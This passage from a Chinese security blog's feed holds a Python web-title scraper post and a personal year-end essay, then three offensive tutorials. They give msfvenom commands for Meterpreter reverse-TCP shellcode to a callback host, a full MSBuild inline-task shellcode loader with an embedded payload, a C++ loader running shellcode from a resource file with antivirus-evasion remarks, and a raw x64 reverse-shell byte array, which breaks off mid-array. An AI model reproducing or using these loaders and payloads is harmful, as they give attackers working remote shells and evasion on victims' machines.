        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近要整理大量的网页资料，刚好完善一下以前写的get-title脚本。<br>目标：获取所有URL对应网页的Title，并以友好的格式输出至文件。<br>此脚本原来是渗透的时候搞网段用的，把扫出来的Web的title列举出来，从而对自己的目标有个大致的概念。但是早先的版本只能说是可以将就着用，往往输出的格式乱七八糟，刚好借着这次机会重写一下。也顺便将其从python2过渡到python3。</p><h1 id="0x01-版本对比"><a href="#0x01-版本对比" class="headerlink" title="0x01 版本对比"></a>0x01 版本对比</h1><p>早期版本：</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupfrom threading import Threadfrom Queue import Queueimport sysimport timeimport signalimport chardetdef getTitle(line):    try:        line=line.strip()        re = requests.get(line, timeout=2)        ret2.write(line + &#39;\n&#39;)        print line+&#39;\t\t&#39;+str(re.status_code)        if re.status_code==200:            text=BeautifulSoup(re.content,&#39;html.parser&#39;)            titles=text.find(&#39;title&#39;)            title=str(titles)            ret.write(line+&#39;\t\t&#39;+title+&#39;\n&#39;)        else:            ret.write(line + &#39;\t\t&#39; + &#39;Error Code:&#39; + re.status_code + &#39;\n&#39;)    except requests.exceptions.Timeout:        ret2.write(line + &#39;\terror\n&#39;)        print line+&#39;\t\ttime out&#39;        ret.write(line+&#39;\t\t&#39;+ &#39;Time out\n&#39;)class Worker(Thread):    def __init__(self, taskQueue):        Thread.__init__(self)        self.setDaemon(True)        self.taskQueue = taskQueue        self.start()    def run(self):        while 1:            try:                callable, args, kwds = self.taskQueue.get(block=False)                callable(*args, **kwds)            except:                breakclass ThreadPool:    def __init__(self):        self.threads = []        self.taskQueue = Queue()        self.threadNum = num_thread        self.__create_taskqueue()        self.__create_threadpool(self.threadNum)    def __create_taskqueue(self):        f = open(&quot;target.txt&quot;, &#39;r&#39;)        lines = f.readlines()        for line in lines:            self.add_task(getTitle, line)        f.close()    def __create_threadpool(self, threadNum):        for i in range(threadNum):            thread = Worker(self.taskQueue)            self.threads.append(thread)    def add_task(self, callable, *args, **kwds):        self.taskQueue.put((callable, args, kwds))    def new_complete(self):        while 1:            time.sleep(0.1)            alive = False            for i in range(num_thread):                alive = alive or self.threads[i].isAlive()            if not alive:                breakdef handler(signum, frame):    global is_exit    print &quot;CTRL+C Is Pressed&quot;    sys.exit(0)if __name__ == &#39;__main__&#39;:    num_thread = 20    signal.signal(signal.SIGINT, handler)    signal.signal(signal.SIGTERM, handler)    ret = open(&quot;titles.txt&quot;, &quot;w&quot;)    ret2=open(&quot;test.txt&quot;,&#39;w&#39;)    tp = ThreadPool()    tp.new_complete()    ret.close()    ret2.close()</code></pre><p>重写极简版本：</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupres=requests.get(url)soup=BeautifulSoup(res.text,&#39;html.parser&#39;)print(soup.title.string)</code></pre><p>最终版本：</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupimport threadpoolimport refrom signal import signal, SIGINTfrom sys import exitproxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;&#125;threads=30timeout=3def handler(signal_received, frame):    print(&#39;SIGINT or CTRL-C detected. Exiting gracefully&#39;)    exit(0)def get_urllist(file):    with open(file,&#39;r&#39;) as target:        targets=target.readlines()        return targetsdef get_title(url):    headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;    try:        res=requests.get(url,headers=headers,proxies=proxies,timeout=timeout)    except :        return &#39;Timeout&#39;    if res.apparent_encoding != None:        response=res.content.decode(res.apparent_encoding)    else:        response=res.text    try:        if &#39;mp.weixin.qq.com&#39; in url:            rule=r&quot;var msg_title = &#39;.*&#39;&quot;            title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)        else:            soup=BeautifulSoup(response,&#39;html.parser&#39;)            if soup.title:                title=str(soup.title.string)            else :                title=&#39;&#39;    except Exception as e:        print(e)        exit(0)    return titledef single_thread(url):    url=url.strip(&#39;\r\n&#39;)    result=url + &#39;\t&#39; + str(get_title(url))    print(result)    with open(&#39;result.txt&#39;,&#39;a+&#39;,encoding=&#39;utf-8&#39;) as output:        output.write(result+&#39;\n&#39;)if __name__ == &#39;__main__&#39;:    signal(SIGINT, handler)    target=get_urllist(&#39;target.txt&#39;)    pool = threadpool.ThreadPool(threads)    threading=threadpool.makeRequests(single_thread,target)    [pool.putRequest(req) for req in threading]    pool.wait()</code></pre><p>简而言之，早期的版本与当前版本区别如下：</p><ul><li>利用多线程的方式有所区别</li><li>解决了不同网页编码格式不同的问题</li><li>增加了代理选项</li><li>解决了微信公众还title爬取不到的问题</li><li>解决一些其他的小BUG</li><li>一些使用体验上的优化</li></ul><h1 id="0x02-探索历程"><a href="#0x02-探索历程" class="headerlink" title="0x02 探索历程"></a>0x02 探索历程</h1><p>早期的版本实际上是直接对其他大佬的代码做的修改，仅仅在使用习惯上做了一些调整，代码逻辑也不甚了解，于是一不做二不休，从零开始重写脚本。</p><h2 id="坑1-微信公众号文章的Title"><a href="#坑1-微信公众号文章的Title" class="headerlink" title="坑1 微信公众号文章的Title"></a>坑1 微信公众号文章的Title</h2><p>最早用极简版测试的时候，发现所有的微信公众号都无法用bs4直接获取到title，于是乎瞅了一眼公众号的源码，title竟然是这个屌样子的……</p><pre><code class="html">&lt;script&gt;    …………    var hd_head_img = &quot;http://xxxxxxxxxx/&quot;||&quot;&quot;;    var ori_head_img_url = &quot;http://xxxxxxxxx/&quot;;    var msg_title = &#39;这里是title&#39;.html(false);    var msg_desc = &quot;XXXXXXXXXX...&quot;;    var msg_cdn_url = &quot;http://XXXXXX/...&quot;;     …………&lt;/script&gt;</code></pre><p>丧心病狂啊……这操作我没太看明白，防爬？</p><p>想多了吧。</p><p>直接正则一把梭：</p><pre><code class="python">if &#39;mp.weixin.qq.com&#39; in url:    rule=r&quot;var msg_title = &#39;.*&#39;&quot;    title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)</code></pre><h2 id="坑2-没有Title"><a href="#坑2-没有Title" class="headerlink" title="坑2 没有Title"></a>坑2 没有Title</h2><p>有些链接是文件的下载链接，没有Title，于是引发bs4报错，于是引发脚本崩溃，这……</p><pre><code class="python">soup=BeautifulSoup(response,&#39;html.parser&#39;)if soup.title:    title=str(soup.title.string)else :    title=&#39;&#39;</code></pre><h2 id="坑3-User-Agent被拦截"><a href="#坑3-User-Agent被拦截" class="headerlink" title="坑3 User-Agent被拦截"></a>坑3 User-Agent被拦截</h2><p>有的防护设备居然会丧心病狂的拦截requests的UA……</p><pre><code class="python">headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;try:    res=requests.get(url,headers=headers,proxies=proxies,timeout=timeout)except :    return &#39;Timeout&#39;</code></pre><h2 id="坑4-编码问题"><a href="#坑4-编码问题" class="headerlink" title="坑4 编码问题"></a>坑4 编码问题</h2><p>这其实是个挺头疼的问题，之前第一版的脚本就一直没有解决。<br>以前读取<code>response</code>的内容，一般是通过两个方式，<code>res.text()</code>或者<code>res.content()</code>。但是这样有一个很头疼的问题，就是每个网站的编码方式不一样，尤其中文网站，用<code>GBK</code>的和用<code>UTF-8</code>的网站几乎一样多。于是输出的时候就是各种乱七八糟的乱码，而一个文件又不可能同时有两种编码格式。<br>经过艰(qing)难(jiao)研(da)究(lao)，最终确定了两种解决方案：</p><ol><li>通过<code>chardet</code>确定编码格式，最终统一成同一种编码方式；</li><li>读取网页<code>response</code>头中的编码格式，然后decode；</li></ol><p>最终我采用的是方案2：</p><pre><code class="python">response = res.content.decode(res.apparent_encoding)</code></pre><p>这里又有一个小坑，有些网站的response头中不会返回编码格式……</p><p>这类网站往往都是默认采用<code>UTF-8</code>格式编码，所以我们直接用<code>res.text</code>就可以了：</p><pre><code class="python">if res.apparent_encoding != None:    response=res.content.decode(res.apparent_encoding)else:    response=res.text</code></pre><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>这次脚本的编写还算比较顺利（毕竟是个很简单的东西），从开始到调试、完工也不过花了两个多小时，还不如写这篇文章花的时间多，大部分时间都花在了滤坑上面。但是其实还是可以分析出一些东西，一是本人确实久疏战阵，不太熟练了；二来，即便比早先的版本改进了一些，但距离作为一个成熟的工具，仍有许多可以改进的地方。</p><h2 id="仍然存在的缺陷"><a href="#仍然存在的缺陷" class="headerlink" title="仍然存在的缺陷"></a>仍然存在的缺陷</h2><ol><li>遭遇某些编码格式的网站时，仍然会报错（如<code>cp1254</code>等）；</li></ol><pre><code class="python">  File &quot;.\get-title.py&quot;, line 28, in get_title    response=res.content.decode(res.apparent_encoding)  File &quot;C:\Environment\Python38\lib\encodings\cp1254.py&quot;, line 15, in decode    return codecs.charmap_decode(input,errors,decoding_table)</code></pre><ol start="2"><li>对于一些比较常见的反爬虫手段，无能为力（爬到的title是<code>Just a moment...</code>，说明在自动验证是否真人访问）</li></ol><h2 id="可以改进的方向"><a href="#可以改进的方向" class="headerlink" title="可以改进的方向"></a>可以改进的方向</h2><ol><li>增加代理池模式，用以解决部分网站TimeOut的问题；</li><li>更加友好的结果呈现，可输出至Excel表格中，最好舍弃csv采用xlsx，因为获取的title千奇百怪，可能破坏csv的格式；</li><li>自动识别一些常见的中间件，如Weblogic等等；</li></ol><h1 id="0x04-2021-2-26更新"><a href="#0x04-2021-2-26更新" class="headerlink" title="0x04 2021.2.26更新"></a>0x04 2021.2.26更新</h1><pre><code class="python">import requestsfrom bs4 import BeautifulSoupimport threadpoolimport refrom signal import signal, SIGINTfrom sys import exitfrom sys import argvuse_proxy=Trueproxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;,&#39;https&#39;:&#39;http://127.0.0.1:10809&#39;&#125;# proxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;&#125;threads=30timeout=10result_encode_type=&#39;gb18030&#39;def handler(signal_received, frame):    print(&#39;SIGINT or CTRL-C detected. Exiting gracefully&#39;)    exit(0)def get_urllist(file):    with open(file,&#39;r&#39;) as target:        targets=target.readlines()        return targetsdef get_title(url):    if &#39;http&#39; not in url:        url = &#39;http://&#39;+url    headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;    try:        if use_proxy:            res = requests.get(url,headers=headers,proxies=proxies,timeout=timeout)        else:            res = requests.get(url,headers=headers,timeout=timeout)    except Exception as e:        print(e)        return &#39;Timeout&#39;    if res.apparent_encoding != None:        try:            encode_type=res.apparent_encoding            response=res.content.decode(encode_type)        except:            print(&quot;#Warning# Can&#39;t decode string as 【%s】.Target URL is 【%s】.&quot; % (res.apparent_encoding,url))            response=res.text    else:        response=res.text    try:        if &#39;mp.weixin.qq.com&#39; in url:            rule=r&quot;var msg_title = &#39;.*&#39;&quot;            title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)        else:            soup=BeautifulSoup(response,&#39;html.parser&#39;)            if soup.title:                title=str(soup.title.string)            else :                title=&#39;&#39;    except Exception as e:        print(e)        exit(0)    return title.strip(&#39;\r\n&#39;)def single_thread(url):    url=url.strip(&#39;\r\n&#39;)    if not url:        return    result=&#39;&quot;&#39;+url + &#39;&quot;,&quot;&#39; + str(get_title(url))+&#39;&quot;&#39;    print(result)    with open(&#39;result.csv&#39;,&#39;a+&#39;,encoding=result_encode_type) as output:        output.write(result+&#39;\n&#39;)if __name__ == &#39;__main__&#39;:    if len(argv)!=2:        print(&#39;Usage:\n  python3 get-title.py [targetfile]&#39;)        exit()    target_file=argv[1]    signal(SIGINT, handler)    target=get_urllist(target_file)    pool = threadpool.ThreadPool(threads)    threading=threadpool.makeRequests(single_thread,target)    [pool.putRequest(req) for req in threading]    pool.wait()    </code></pre><ul><li>优化了输出方式，改为输出到CSV表格；</li><li>修正了爬HTTPS会出现问题的BUG，这么明显的BUG一开始的时候居然没发现……</li><li>修正了部分网站爬取时编码问题异常的BUG；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 - 2021</title>
      <link href="/2021/01/01/2020-2021/"/>
      <url>/2021/01/01/2020-2021/</url>
      
        <content type="html"><![CDATA[<p>总结一下吧。</p><p>2020年是很浑浊的一年，直到昨晚跨年的时候我还是很懵逼，潜意识还完全没意识到2020年就这么过去了。</p><p>这一年发生了很多的事情，对我个人而言，对这个世界而言，都是如此。这中间的共同点是，似乎没有什么事情是比较完满的。但这一篇并不是回忆录，所以我也不打算像收拾抽屉一样把它们一件一件堆叠起来。捡一些想说的说吧。</p><hr><hr><p>说起来，当初选择网络安全方向的初衷，其实是希望学习一些黑客技术，以便能够看到屏闭了我的妹子的QQ空间。</p><p>这个目标至今没有达成。</p><p>而且时过境迁，现在也没有多少人玩QQ了。</p><hr><p>意识到这个目标成为泡影之后，我想过很多次，为什么要留在这个行业。答案是，因为兴趣。</p><p>这是一个仅仅通过技术，就可以获得最原始、最纯粹的成就感的行业。信息安全是一个很广袤的定义，从开锁、到欺骗、到0Day，好像什么东西都能涵盖到信息安全的定义里面，你可以很轻易地在里面找到你感兴趣的东西。而我本人，正如<a href="https://7mitu.github.io/about/">个人描述</a>里说的那样，喜欢每个技能都点一下，传统功夫讲究点到为止（不是）。</p><hr><p>这一年来其实很苦恼，我目前的技术水平也就算个T，但是周围所有人好像都在谈APT。</p><p>饶是我这钛合金脸皮也遭不住天天面部刮痧呀。</p><hr><p>希望2021年：</p><ul><li>疫情早日结束</li><li>找到自己想要的是什么</li><li>钻研技术</li><li>远离一些虚伪</li><li>找个女朋友</li></ul><hr><p>以上。</p><p><img src="/2021/01/01/2020-2021/backiee-114501.jpg" alt="backiee-114501"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用.Net Framework加载Shellcode</title>
      <link href="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/"/>
      <url>/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-场景"><a href="#0x00-场景" class="headerlink" title="0x00 场景"></a>0x00 场景</h3><ul><li>Windows操作系统</li><li>存在.Net Framework环境</li><li>无法上传exe等可执行文件</li></ul><h3 id="0x01-生成载荷"><a href="#0x01-生成载荷" class="headerlink" title="0x01 生成载荷"></a>0x01 生成载荷</h3><p>这里以MSF Meterpreter载荷为例，首先生成Shellcode：</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=2333 -f csharp</code></pre><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133105384.png" alt="image-20201228133105384"></p><p>制作MSBuild载荷，将生成的Shellcode粘贴在下方代码的<code>shellcode</code>变量中，并保存为文件<code>bad.xml</code>：</p><pre><code class="xml">&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;         &lt;!-- This inline task executes shellcode. --&gt;         &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;         &lt;!-- Save This File And Execute The Above Command --&gt;         &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;         &lt;!-- License: BSD 3-Clause --&gt;      &lt;Target Name=&quot;Hello&quot;&gt;        &lt;ClassExample /&gt;      &lt;/Target&gt;      &lt;UsingTask        TaskName=&quot;ClassExample&quot;        TaskFactory=&quot;CodeTaskFactory&quot;        AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;        &lt;Task&gt;                  &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;          &lt;![CDATA[        using System;        using System.Runtime.InteropServices;        using Microsoft.Build.Framework;        using Microsoft.Build.Utilities;        public class ClassExample :  Task, ITask        &#123;                   private static UInt32 MEM_COMMIT = 0x1000;                    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;                    [DllImport(&quot;kernel32&quot;)]            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);                    [DllImport(&quot;kernel32&quot;)]            private static extern IntPtr CreateThread(                        UInt32 lpThreadAttributes,            UInt32 dwStackSize,            UInt32 lpStartAddress,            IntPtr param,            UInt32 dwCreationFlags,            ref UInt32 lpThreadId                       );          [DllImport(&quot;kernel32&quot;)]            private static extern UInt32 WaitForSingleObject(                       IntPtr hHandle,            UInt32 dwMilliseconds            );                    public override bool Execute()          &#123;            //replace with your own shellcode            byte[] shellcode = new byte[] &#123; 0x33,0xc9,0x83,0xe9,0xaa,0xe8,0xff,0xff,0xff,0xff,0xc0,0x5e,0x81,0x76,0x0e,0x1c,0xb8,0xf2,0x6e,0x83,0xee,0xfc,0xe2,0xf4,0xe0,0x50,0x70,0x6e,0x1c,0xb8,0x92,0xe7,0xf9,0x89,0x32,0x0a,0x97,0xe8,0xc2,0xe5,0x4e,0xb4,0x79,0x3c,0x08,0x33,0x80,0x46,0x13,0x0f,0xb8,0x48,0x2d,0x47,0x5e,0x52,0x7d,0xc4,0xf0,0x42,0x3c,0x79,0x3d,0x63,0x1d,0x7f,0x10,0x9c,0x4e,0xef,0x79,0x3c,0x0c,0x33,0xb8,0x52,0x97,0xf4,0xe3,0x16,0xff,0xf0,0xf3,0xbf,0x4d,0x33,0xab,0x4e,0x1d,0x6b,0x79,0x27,0x04,0x5b,0xc8,0x27,0x97,0x8c,0x79,0x6f,0xca,0x89,0x0d,0xc2,0xdd,0x77,0xff,0x6f,0xdb,0x80,0x12,0x1b,0xea,0xbb,0x8f,0x96,0x27,0xc5,0xd6,0x1b,0xf8,0xe0,0x79,0x36,0x38,0xb9,0x21,0x08,0x97,0xb4,0xb9,0xe5,0x44,0xa4,0xf3,0xbd,0x97,0xbc,0x79,0x6f,0xcc,0x31,0xb6,0x4a,0x38,0xe3,0xa9,0x0f,0x45,0xe2,0xa3,0x91,0xfc,0xe7,0xad,0x34,0x97,0xaa,0x19,0xe3,0x41,0xd0,0xc1,0x5c,0x1c,0xb8,0x9a,0x19,0x6f,0x8a,0xad,0x3a,0x74,0xf4,0x85,0x48,0x1b,0x31,0x1a,0x91,0xcc,0x00,0x62,0x6f,0x1c,0xb8,0xdb,0xaa,0x48,0xe8,0x9a,0x47,0x9c,0xd3,0xf2,0x91,0xc9,0xd2,0xf8,0x06,0xdc,0x10,0xa4,0xeb,0x74,0xba,0xf2,0x67,0x01,0x31,0x14,0x3e,0x4c,0xe8,0xa2,0x2e,0x4c,0xf8,0xa2,0x06,0xf6,0xb7,0x2d,0x8e,0xe3,0x6d,0x65,0x04,0x0c,0xee,0xa5,0x06,0x85,0x1d,0x86,0x0f,0xe3,0x6d,0x77,0xae,0x68,0xb2,0x0d,0x20,0x14,0xcd,0x1e,0x86,0x7b,0xb8,0xf2,0x6e,0x76,0xb8,0x98,0x6a,0x4a,0xef,0x9a,0x6c,0xc5,0x70,0xad,0x91,0xc9,0x3b,0x0a,0x6e,0x62,0x8e,0x79,0x58,0x76,0xf8,0x9a,0x6e,0x0c,0xb8,0xf2,0x38,0x76,0xb8,0x9a,0x36,0xb8,0xeb,0x17,0x91,0xc9,0x2b,0xa1,0x04,0x1c,0xee,0xa1,0x39,0x74,0xba,0x2b,0xa6,0x43,0x47,0x27,0xed,0xe4,0xb8,0x8f,0x46,0x44,0xd0,0xf2,0x2e,0x1c,0xb8,0x98,0x6e,0x4c,0xd0,0xf9,0x41,0x13,0x88,0x0d,0xbb,0x4b,0xd0,0x87,0x00,0x51,0xd9,0x0d,0xbb,0x42,0xe6,0x0d,0x62,0x38,0xb7,0x77,0x1e,0xe3,0x47,0x0d,0x87,0x87,0x47,0x0d,0x91,0x1d,0x7b,0xdb,0xa8,0x69,0x79,0x31,0xd5,0xec,0x0d,0x50,0x38,0x76,0xb8,0xa1,0x91,0xc9,0xb8,0xf2,0x6e &#125;;                            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,            MEM_COMMIT, PAGE_EXECUTE_READWRITE);              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);              IntPtr hThread = IntPtr.Zero;              UInt32 threadId = 0;              IntPtr pinfo = IntPtr.Zero;              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);              WaitForSingleObject(hThread, 0xFFFFFFFF);              return true;          &#125;         &#125;               ]]&gt;          &lt;/Code&gt;        &lt;/Task&gt;      &lt;/UsingTask&gt;    &lt;/Project&gt;</code></pre><h3 id="0x02-执行载荷"><a href="#0x02-执行载荷" class="headerlink" title="0x02 执行载荷"></a>0x02 执行载荷</h3><p>首先利用MSF的<code>exploit/multi/handler</code>开启监听，然后我们在受控主机上执行：</p><pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319&gt;MSBuild D:/bad.xml</code></pre><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133814195.png" alt="image-20201228133814195"></p><p>回连Shell如下：</p><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133910387.png" alt="image-20201228133910387"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> 持久化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过资源文件加载Shellcode</title>
      <link href="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/"/>
      <url>/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-生成Shellcode"><a href="#0x01-生成Shellcode" class="headerlink" title="0x01 生成Shellcode"></a>0x01 生成Shellcode</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=12345 &gt;payload.bin</code></pre><h3 id="0x02-添加资源文件"><a href="#0x02-添加资源文件" class="headerlink" title="0x02 添加资源文件"></a>0x02 添加资源文件</h3><p>右键<code>资源文件&gt;添加&gt;资源</code>添加我们刚刚生成的Shellcode</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140005634.png" alt="image-20201225140005634"></p><p>选择<code>导入</code>，添加<code>payload.bin</code></p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140229778.png" alt="image-20201225140229778"></p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140458518.png" alt="image-20201225140458518"></p><p>我们可以在资源文件中看到我们的bin文件已经被加载</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140603313.png" alt="image-20201225140603313"></p><p>代码：</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;resource.h&quot;int main()&#123;    // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode    // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin    HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_BIN1), L&quot;PAYLOAD_BIN&quot;);    DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);    HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);    void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    memcpy(exec, shellcodeResouceData, shellcodeSize);    ((void(*)())exec)();    return  0;&#125;</code></pre><h3 id="0x03-编译和验证"><a href="#0x03-编译和验证" class="headerlink" title="0x03 编译和验证"></a>0x03 编译和验证</h3><p>编译成功没有什么问题</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141139791.png" alt="image-20201225141139791"></p><p>生成的exe放到虚拟机里运行一下，成功</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141256996.png" alt="image-20201225141256996"></p><p>免杀率……将就吧，毕竟并没有做什么免杀的措施，只是一种加载shellcode的技巧而已</p><p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141643919.png" alt="image-20201225141643919"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>避开Windows API执行Shellcode</title>
      <link href="/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/"/>
      <url>/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><pre><code class="c++">#pragma section(&quot;.text&quot;)// msvenom -p windows/x64/shell_reverse_tcp lhost=X lport=Y -f c__declspec(allocate(&quot;.text&quot;)) char goodcode[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33&quot;&quot;\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00&quot;&quot;\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x38\x66\x41\x54&quot;&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c&quot;&quot;\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff&quot;&quot;\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2&quot;&quot;\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48&quot;&quot;\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99&quot;&quot;\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63&quot;&quot;\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57&quot;&quot;\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44&quot;&quot;\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6&quot;&quot;\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff&quot;&quot;\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5&quot;&quot;\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x